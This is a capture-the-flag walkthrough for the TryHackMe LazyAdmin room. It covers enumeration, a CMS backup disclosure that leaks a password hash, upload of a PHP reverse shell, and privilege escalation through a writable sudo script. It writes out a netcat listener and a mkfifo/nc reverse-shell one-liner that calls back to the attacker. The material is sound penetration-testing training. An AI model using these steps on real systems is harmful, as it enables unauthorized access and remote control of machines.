# CTF-Write-up

## Try Hack Me: LazyAdmin

##### URL: https://tryhackme.com/room/lazyadmin

##### Created by _MrSeth6797_

![LOGO](https://user-images.githubusercontent.com/20625004/110367101-e9e80200-804f-11eb-8b4f-d78f95f0d930.PNG)

You should deploy the machine first.

Run nmap against the target machine.

```nmap <target IP>```

![nmap](https://user-images.githubusercontent.com/20625004/110367723-bc4f8880-8050-11eb-9081-b9d0124b49f7.PNG)

Port 80 web access. 

![port80](https://user-images.githubusercontent.com/20625004/110367979-13555d80-8051-11eb-8a8e-83295c572554.PNG)

Next we fire up ```gobuster``` in order to seach for paths in the web application that will help us to map the app.

We found the path ```/content/``` with some info about the CMS that is being used on the web app.

![path1](https://user-images.githubusercontent.com/20625004/110368430-b3ab8200-8051-11eb-8251-ddcd3f1c1042.PNG)

Then we use again ```gobuster``` with the new path in order to reveal other paths.

![gobuster](https://user-images.githubusercontent.com/20625004/110369032-75fb2900-8052-11eb-8dec-b4e8edfdb726.PNG)

And now we have found a login page.

![path2](https://user-images.githubusercontent.com/20625004/110368771-2c124300-8052-11eb-9ab5-f96f7eb8c8d3.PNG)

Searching for exploits we found that there is a Backup Disclosure vulnerability.

By using the below path we can see that the mysql_backup file can be downloaded.

```http://<target IP>/content/inc/mysql_backup/```

Within the file there is user and a hashed password.

![hashed](https://user-images.githubusercontent.com/20625004/110369521-2f59fe80-8053-11eb-896d-cc83706dad92.PNG)

Use an online cracking site or hashcat to reveal the right one.

Use the creds from previous step to login and navigate to the web application. Navigate to media center and upload the reverse shell ```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php``` renaming it to something.php5, and now we have uploaded the file. 

![cms](https://user-images.githubusercontent.com/20625004/110370935-fd499c00-8054-11eb-93f2-1095f2ad08a5.PNG)

open terminal and execute nc -lnvp 4444 and the access the file you have uploaded, and now you got shell to the system.

After searching around you can found the first flag on the path /home/something/user.txt

![flag1](https://user-images.githubusercontent.com/20625004/110371811-29195180-8056-11eb-91e0-a0a6ef444808.PNG)

For the second flag we have to escalete our privileges.

```sudo -l``` reveal that we can run (‘sh’,’/etc/copy.sh’) and checking the permission of /etc/copy.sh we see we can modify that and we change the file.

![flag2_1](https://user-images.githubusercontent.com/20625004/110375247-641d8400-805a-11eb-817d-58820320dda2.PNG)

```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 4444" >/tmp/f > copy.sh``` 

Now running backup.pl with sudo gives us a reverse shell.

```sudo /usr/bin/perl /home/itguy/backup.pl```.

on /root/ there is the second flag.

